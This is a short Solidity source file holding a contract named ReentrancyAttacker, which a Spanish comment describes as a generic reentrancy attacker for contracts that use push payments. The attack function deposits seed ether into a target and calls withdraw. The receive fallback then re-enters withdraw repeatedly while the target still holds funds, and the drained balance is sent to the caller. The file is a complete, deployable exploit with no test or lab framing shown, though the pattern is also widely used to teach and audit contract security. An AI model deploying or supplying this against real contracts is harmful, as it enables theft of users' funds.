// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Atacante genérico de reentrancia para contratos que usan push-payments.
interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerable public target;
    uint256 public rounds;
    bool internal attacking;

    event Drained(uint256 value);

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "seed required");
        target.deposit{value: msg.value}();
        attacking = true;
        target.withdraw();
        attacking = false;
        emit Drained(address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (attacking && address(target).balance > 0 && target.balances(address(this)) > 0) {
            rounds++;
            target.withdraw();
        }
    }
}

